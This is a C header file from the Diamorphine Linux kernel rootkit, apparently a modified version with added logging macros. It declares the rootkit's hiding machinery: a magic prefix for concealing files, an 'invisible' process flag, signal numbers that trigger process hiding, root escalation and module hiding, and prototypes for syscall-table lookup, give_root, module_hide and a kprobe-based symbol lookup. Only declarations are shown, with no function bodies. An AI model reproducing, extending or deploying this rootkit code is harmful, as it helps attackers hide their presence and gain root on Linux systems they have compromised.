#include <linux/types.h>

struct linux_dirent {
  unsigned long d_ino;
  unsigned long d_off;
  unsigned short d_reclen;
  char d_name[1];
};

/* Use kernel's built-in linux_dirent64 structure */

#define MAGIC_PREFIX "diamorphine_secret"

#define PF_INVISIBLE 0x10000000

#define MODULE_NAME "diamorphine"

// enum {
//   SIGINVIS = 31,
//   SIGSUPER = 64,
//   SIGMODINVIS = 63,
// };

// Test those signals if the other ones are not working.
enum {
	SIGINVIS = 10,
	SIGSUPER = 12,
	SIGMODINVIS = 28,
};

#ifndef IS_ENABLED
#define IS_ENABLED(option)                                                     \
  (defined(__enabled_##option) || defined(__enabled_##option##_MODULE))
#endif

/* Logging definitions */
#define LOG_LEVEL_ERROR 0
#define LOG_LEVEL_WARN 1
#define LOG_LEVEL_INFO 2
#define LOG_LEVEL_DEBUG 3

/* Current log level - can be modified at runtime */
extern int log_level;

/* Logging macros */
#define LOG_ERROR(fmt, ...)                                                    \
  do {                                                                         \
    if (log_level >= LOG_LEVEL_ERROR)                                          \
      printk(KERN_ERR "[DIAMORPHINE] ERROR: " fmt "\n", ##__VA_ARGS__);        \
  } while (0)

#define LOG_WARN(fmt, ...)                                                     \
  do {                                                                         \
    if (log_level >= LOG_LEVEL_WARN)                                           \
      printk(KERN_WARNING "[DIAMORPHINE] WARN: " fmt "\n", ##__VA_ARGS__);     \
  } while (0)

#define LOG_INFO(fmt, ...)                                                     \
  do {                                                                         \
    if (log_level >= LOG_LEVEL_INFO)                                           \
      printk(KERN_INFO "[DIAMORPHINE] INFO: " fmt "\n", ##__VA_ARGS__);        \
  } while (0)

#define LOG_DEBUG(fmt, ...)                                                    \
  do {                                                                         \
    if (log_level >= LOG_LEVEL_DEBUG)                                          \
      printk(KERN_DEBUG "[DIAMORPHINE] DEBUG: " fmt "\n", ##__VA_ARGS__);      \
  } while (0)

/* Function entry/exit logging macros */
#define LOG_FUNC_ENTRY() LOG_DEBUG("Entering function: %s", __FUNCTION__)
#define LOG_FUNC_EXIT() LOG_DEBUG("Exiting function: %s", __FUNCTION__)
#define LOG_FUNC_EXIT_RET(ret)                                                 \
  LOG_DEBUG("Exiting function: %s with return value: %d", __FUNCTION__, ret)

/* Function prototypes */
unsigned long *get_syscall_table_bf(void);
struct task_struct *find_task(pid_t pid);
int is_invisible(pid_t pid);
void give_root(void);
void module_show(void);
void module_hide(void);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {.symbol_name = "kallsyms_lookup_name"};
#endif
